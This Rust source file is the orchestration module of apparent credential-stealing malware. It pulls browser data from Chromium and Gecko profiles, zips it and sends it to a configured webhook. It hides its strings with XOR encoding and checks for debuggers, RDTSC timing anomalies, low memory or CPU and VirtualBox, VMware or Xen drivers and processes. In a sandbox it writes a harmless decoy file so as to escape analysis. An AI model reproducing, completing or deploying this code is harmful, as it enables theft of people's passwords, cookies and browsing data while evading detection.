//! Browser data extraction orchestration and host environment checks.

pub mod chrome_inject;
pub mod chromium;
pub mod gecko;
mod dpapi_fallback;
mod netscape;
pub mod sender;
mod zip_layout;

use std::path::PathBuf;

const XOR_KEY: u8 = 0x5A;
const MIN_MEMORY_BYTES: u64 = 4 * 1024 * 1024 * 1024;
const MAX_CPU_CORES: usize = 2;

pub(crate) fn xor_str(data: &[u8]) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
}

pub(crate) fn xor_bytes(data: &[u8]) -> Vec<u8> {
    data.iter().map(|&b| b ^ XOR_KEY).collect()
}

pub(crate) fn zeroize_vec(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        *b = 0;
    }
    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
}

pub(crate) fn env_configured() -> bool {
    std::env::var(xor_str(&[
        0x08, 0x0F, 0x09, 0x0E, 0x05, 0x18, 0x1B, 0x19, 0x11, 0x0E, 0x08, 0x1B, 0x19, 0x1F,
    ]))
    .ok()
    .as_deref()
    == Some(&xor_str(&[0x6B]))
}

/// Returns `true` when a debugger is attached.
pub fn is_debugger_attached() -> bool {
    inject::anti::debugger_present()
}

/// Returns `true` when a simple RDTSC timing check suggests instrumentation.
pub fn rdtsc_timing_anomaly() -> bool {
    inject::anti::rdtsc_anomaly()
}

/// Returns `true` when the host looks like an analysis or sandbox environment.
pub fn is_analysis_environment() -> bool {
    is_debugger_attached() || rdtsc_timing_anomaly() || is_virtualized_environment()
}

fn drivers_dir() -> PathBuf {
    std::env::var(xor_str(&[
        0x09, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x08, 0x35, 0x35, 0x2E,
    ]))
    .map(PathBuf::from)
    .unwrap_or_else(|_| {
        PathBuf::from(xor_str(&[
            0x19, 0x60, 0x06, 0x0D, 0x33, 0x34, 0x3E, 0x35, 0x2D, 0x29,
        ]))
    })
    .join(xor_str(&[0x09, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x69, 0x68]))
    .join(xor_str(&[0x3E, 0x28, 0x33, 0x2C, 0x3F, 0x28, 0x29]))
}

fn low_physical_memory() -> bool {
    use windows::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};

    unsafe {
        let mut status = MEMORYSTATUSEX {
            dwLength: std::mem::size_of::<MEMORYSTATUSEX>() as u32,
            ..Default::default()
        };
        if GlobalMemoryStatusEx(&mut status).is_err() {
            return false;
        }
        status.ullTotalPhys < MIN_MEMORY_BYTES
    }
}

fn low_cpu_count() -> bool {
    std::thread::available_parallelism()
        .map(|count| count.get() <= MAX_CPU_CORES)
        .unwrap_or(false)
}

fn vm_drivers_present() -> bool {
    let drivers = drivers_dir();
    let names = [
        xor_str(&[0x2C, 0x37, 0x37, 0x35, 0x2F, 0x29, 0x3F, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x32, 0x3D, 0x3C, 0x29, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x39, 0x33, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x2F, 0x29, 0x38, 0x37, 0x35, 0x2F, 0x29, 0x3F, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x0C, 0x18, 0x35, 0x22, 0x1D, 0x2F, 0x3F, 0x29, 0x2E, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x0C, 0x18, 0x35, 0x22, 0x17, 0x35, 0x2F, 0x29, 0x3F, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x0C, 0x18, 0x35, 0x22, 0x09, 0x1C, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x0C, 0x18, 0x35, 0x22, 0x0C, 0x33, 0x3E, 0x3F, 0x35, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x22, 0x3F, 0x34, 0x38, 0x2F, 0x29, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x22, 0x3F, 0x34, 0x3F, 0x2C, 0x2E, 0x39, 0x32, 0x34, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x22, 0x3F, 0x34, 0x2C, 0x38, 0x3E, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x38, 0x2F, 0x29, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x3D, 0x33, 0x3E, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x32, 0x23, 0x2A, 0x3F, 0x28, 0x31, 0x38, 0x3E, 0x74, 0x29, 0x23, 0x29]),
    ];
    names.iter().any(|name| drivers.join(name).exists())
}

fn vm_processes_present() -> bool {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };

    let targets = [
        xor_str(&[0x2C, 0x37, 0x2E, 0x35, 0x35, 0x36, 0x29, 0x3E, 0x74, 0x3F, 0x22, 0x3F]),
        xor_str(&[0x2C, 0x37, 0x2D, 0x3B, 0x28, 0x3F, 0x2E, 0x28, 0x3B, 0x23, 0x74, 0x3F, 0x22, 0x3F]),
        xor_str(&[0x2C, 0x37, 0x2D, 0x3B, 0x28, 0x3F, 0x2F, 0x29, 0x3F, 0x28, 0x74, 0x3F, 0x22, 0x3F]),
        xor_str(&[0x2C, 0x38, 0x35, 0x22, 0x29, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F, 0x74, 0x3F, 0x22, 0x3F]),
        xor_str(&[0x2C, 0x38, 0x35, 0x22, 0x2E, 0x28, 0x3B, 0x23, 0x74, 0x3F, 0x22, 0x3F]),
        xor_str(&[0x22, 0x3F, 0x34, 0x29, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F, 0x74, 0x3F, 0x22, 0x3F]),
    ];

    unsafe {
        let snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(handle) => handle,
            Err(_) => return false,
        };
        let _guard = SnapshotGuard(snapshot);

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        if Process32FirstW(snapshot, &mut entry).is_err() {
            return false;
        }

        loop {
            let exe = process_name(&entry);
            if targets.iter().any(|target| exe.eq_ignore_ascii_case(target)) {
                return true;
            }
            if Process32NextW(snapshot, &mut entry).is_err() {
                break;
            }
        }
    }

    false
}

struct SnapshotGuard(windows::Win32::Foundation::HANDLE);

impl Drop for SnapshotGuard {
    fn drop(&mut self) {
        use windows::Win32::Foundation::CloseHandle;
        unsafe {
            let _ = CloseHandle(self.0);
        }
    }
}

fn process_name(entry: &windows::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32W) -> String {
    let len = entry
        .szExeFile
        .iter()
        .position(|&ch| ch == 0)
        .unwrap_or(entry.szExeFile.len());
    String::from_utf16_lossy(&entry.szExeFile[..len])
}

/// Returns `true` when VM drivers, processes, or low-resource signals are present.
pub fn is_virtualized_environment() -> bool {
    low_physical_memory()
        || low_cpu_count()
        || vm_drivers_present()
        || vm_processes_present()
}

/// Writes a harmless decoy file when running in a sandbox-like environment.
pub fn run_sandbox_decoy() {
    let path = std::env::temp_dir().join(xor_str(&[
        0x29, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x05, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x05, 0x39,
        0x32, 0x3F, 0x39, 0x31, 0x74, 0x2E, 0x22, 0x2E,
    ]));
    let _ = std::fs::write(
        path,
        xor_str(&[
            0x09, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x7A, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x7A,
            0x39, 0x32, 0x3F, 0x39, 0x31, 0x7A, 0x39, 0x35, 0x37, 0x2A, 0x36, 0x3F, 0x2E, 0x3F,
            0x3E, 0x7A, 0x29, 0x2F, 0x39, 0x39, 0x3F, 0x29, 0x29, 0x3C, 0x2F, 0x36, 0x36, 0x23,
            0x74, 0x50,
        ]),
    );
}

/// Extracts browser data and sends it to the configured webhook when allowed.
pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<dyn std::error::Error>> {
    if is_analysis_environment() {
        if is_virtualized_environment() {
            run_sandbox_decoy();
        }
        return Ok(());
    }

    if !env_configured() {
        return Ok(());
    }

    let mut all_files: Vec<(String, String)> = Vec::new();

    let gecko_handle = std::thread::spawn(|| gecko::extract_all());
    let chromium_files = chromium::extract_all();
    let gecko_files = gecko_handle.join().unwrap_or_default();

    all_files.extend(chromium_files);
    all_files.extend(gecko_files);

    zip_layout::sort_entries(&mut all_files);

    if !all_files.is_empty() {
        sender::send_zip(client, webhook_url, &all_files).await?;
    }

    Ok(())
}
